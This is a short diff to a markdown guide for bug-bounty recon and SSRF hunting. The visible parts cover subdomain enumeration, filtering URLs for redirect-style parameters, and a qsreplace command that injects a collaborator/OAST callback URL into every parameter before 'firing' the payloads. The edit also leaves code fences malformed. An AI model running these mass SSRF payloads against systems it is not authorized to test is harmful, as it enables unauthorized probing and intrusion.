@@ -27,7 +27,6 @@ Subdomain Enum → Deduplicate → Live Probe → URL Collection → Filter Para
 - [ ] `amass` installed  
 - [ ] `assetfinder` installed  
 
-``bash
 # Fast & passive
 subfinder -d example.test000.com -o subfinder.txt
 
@@ -82,13 +81,13 @@ cat all_urls.txt | grep "=" > params.txt
 cat all_urls.txt | grep -E "(url|file|path|next|redirect|dest|callback|image|src|return|forward)" > juicy_params.txt
 ```
 
-### 7. Inject Burp Collaborator / OAST Payload
+# 7. Inject Burp Collaborator / OAST Payload
 
-```bash
+``bash
 # Replace YOUR_COLLAB with your real collaborator domain
 cat juicy_params.txt | qsreplace "http://YOUR_COLLAB.oastify.com" > ssrf_payloads.txt
 # or use params.txt if you want everything
-```
+``
 
 ### 8. Fire All Payloads
 
